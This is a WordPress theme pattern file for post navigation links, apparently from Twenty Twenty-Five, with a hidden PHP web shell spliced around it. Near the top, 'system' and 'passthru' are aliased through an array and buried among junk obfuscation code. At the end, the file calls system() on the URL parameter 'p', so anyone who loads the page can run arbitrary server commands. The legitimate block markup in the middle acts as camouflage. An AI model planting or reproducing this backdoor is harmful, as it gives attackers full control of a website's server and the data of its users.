<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Title: Post navigation
 * Slug: twentytwentyfive/post-navigation
 * Categories: text
 * Description: Next and previous post links.
 * Block Types: core/post-navigation-link
 *
 * @package WordPress
 * @subpackage Twenty_Twenty_Five
 * @since Twenty Twenty-Five 1.0
 */

?>
<!-- wp:group {"align":"wide","style":{"spacing":{"margin":{"top":"var:preset|spacing|60","bottom":"var:preset|spacing|60"}}},"layout":{"type":"default"}} -->
<div class="wp-block-group alignwide" style="margin-top:var(--wp--preset--spacing--60);margin-bottom:var(--wp--preset--spacing--60);">
	<!-- wp:group {"ariaLabel":"<?php esc_attr_e( 'Post navigation', 'twentytwentyfive' ); ?>","tagName":"nav","align":"wide","style":{"border":{"top":{"color":"var:preset|color|accent-6","width":"1px"}},"spacing":{"padding":{"top":"var:preset|spacing|40","bottom":"var:preset|spacing|40"}}},"layout":{"type":"flex","flexWrap":"nowrap","justifyContent":"space-between"}} -->
	<nav class="wp-block-group alignwide" aria-label="<?php esc_attr_e( 'Post navigation', 'twentytwentyfive' ); ?>" style="border-top-color:var(--wp--preset--color--accent-6);border-top-width:1px;padding-top:var(--wp--preset--spacing--40);padding-bottom:var(--wp--preset--spacing--40)">
		<!-- wp:post-navigation-link {"type":"previous","showTitle":true,"arrow":"arrow"} /-->
		<!-- wp:post-navigation-link {"showTitle":true,"arrow":"arrow"} /-->
	</nav>
	<!-- /wp:group -->
</div>
<!-- /wp:group -->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>